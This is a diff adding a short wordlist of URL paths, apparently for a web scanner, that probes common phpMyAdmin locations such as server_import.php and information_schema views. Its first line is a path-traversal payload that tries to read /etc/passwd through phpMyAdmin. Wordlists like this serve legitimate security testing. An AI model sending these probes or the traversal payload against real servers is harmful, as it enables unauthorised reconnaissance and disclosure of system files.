@@ -1,0 +1,13 @@
+/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
+/pma/server_import.php
+/phpmyadmin/server_import.php
+/phpMyAdmin 2/server_import.php
+/db/server_import.php
+/server_import.php
+/PMA/server_import.php
+/admin/server_import.php
+/admin/pma/server_import.php
+/phpMyAdmin/server_import.php
+/admin/phpMyAdmin/server_import.php
+/phpmyadmin/index.php?db=information_schema
+/phpMyAdmin/index.php?db=information_schema
